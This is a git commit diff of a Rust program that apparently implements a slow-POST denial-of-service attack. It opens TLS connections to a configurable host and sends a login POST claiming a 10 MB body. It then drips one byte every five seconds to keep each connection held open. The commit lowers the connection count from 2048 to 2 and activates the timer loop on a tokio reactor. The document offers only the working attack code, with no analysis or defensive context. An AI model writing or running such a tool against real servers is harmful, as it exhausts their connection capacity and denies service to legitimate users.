a942fe41d78e9c4f1e61dcd15bf9df33dc6c0b8e
Andrey Voronkov <voronkovaa@gmail.com>
2017-05-19 02:42:53 +0300

    Seems like a timer bug.

--- src/main.rs
+++ src/main.rs
@@ -15,31 +15,38 @@ use std::sync::Arc;
 
 use futures::*;
 use futures_cpupool::CpuPool;
+use tokio_core::reactor::Core;
 use tokio_timer::*;
 
 fn main() {
     let host = env::var("HOST").unwrap();
     let port = "443";
     let timeout = 5;
-    let connections_count = 2048;
+    let connections_count = 2;
 
-    let pool = CpuPool::new(2);
+    let mut core = Core::new().unwrap();
+    let handle = core.handle();
 
     let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 10000000\r\n\r\n", host);
-    for connection_number in 0..connections_count {
+    let connections_stream: Vec<Result<u32, ()>> = (0..connections_count).map(|i| Ok(i)).collect();
+    let runner = stream::iter(connections_stream).for_each(move |connection_number| {
         let connector = TlsConnector::builder().unwrap().build().unwrap();
         let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
         let mut stream = Box::new(connector.connect(&host, stream).unwrap());
         stream.write(start.as_bytes());
         stream.flush();
 
-//        let timer = Timer::default().interval(Duration::from_secs(timeout)).for_each(move |_| {
-//            stream.write(b"a");
-//            stream.flush();
-//            println!("Stream number: {} written.", connection_number);
-//            Ok(())
-//        });
-//        let task = pool.spawn(timer);
-//        println!("Stream number: {} spawned.", connection_number);
-    }
+        let timer = Timer::default().interval(Duration::from_secs(timeout)).for_each(move |_| {
+            stream.write(b"a");
+            stream.flush();
+            println!("Stream number: {} written.", connection_number);
+            Ok(())
+        });
+        let task = handle.spawn(timer.map_err(|_| println!("HIHI")));
+        println!("Stream number: {} spawned.", connection_number);
+        Ok(())
+    });
+    core.run(runner);
+
+    loop {}
 }
